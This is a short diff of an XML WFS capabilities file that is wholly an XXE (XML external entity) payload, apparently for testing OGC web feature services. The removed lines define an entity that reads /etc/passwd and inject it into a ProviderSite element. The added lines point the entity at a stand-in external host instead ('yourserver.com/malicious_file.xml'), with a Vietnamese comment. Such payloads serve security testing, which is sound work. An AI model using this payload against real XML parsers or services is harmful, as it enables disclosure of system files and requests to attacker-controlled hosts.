@@ -1,11 +1,10 @@
-<?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE WFS_Capabilities [
-  <!ENTITY xxetarget SYSTEM "file:///etc/passwd"> <!-- XXE Attack -->
+  <!ENTITY xxetarget SYSTEM "http://yourserver.com/malicious_file.xml"> <!-- Tham chiếu từ URL bên ngoài -->
 ]>
 <wfs:WFS_Capabilities xmlns:wfs="http://www.opengis.net/wfs">
     <wfs:ServiceProvider>
         <wfs:ProviderName>Sample Service Provider</wfs:ProviderName>
         <wfs:ProviderSite xlink:href="http://www.sampleprovider.com"/>
-        <wfs:ProviderSite> &xxetarget; </wfs:ProviderSite> <!-- Inject external entity -->
+        <wfs:ProviderSite> &xxetarget; </wfs:ProviderSite> <!-- Inject external URL -->
     </wfs:ServiceProvider>
 </wfs:WFS_Capabilities>
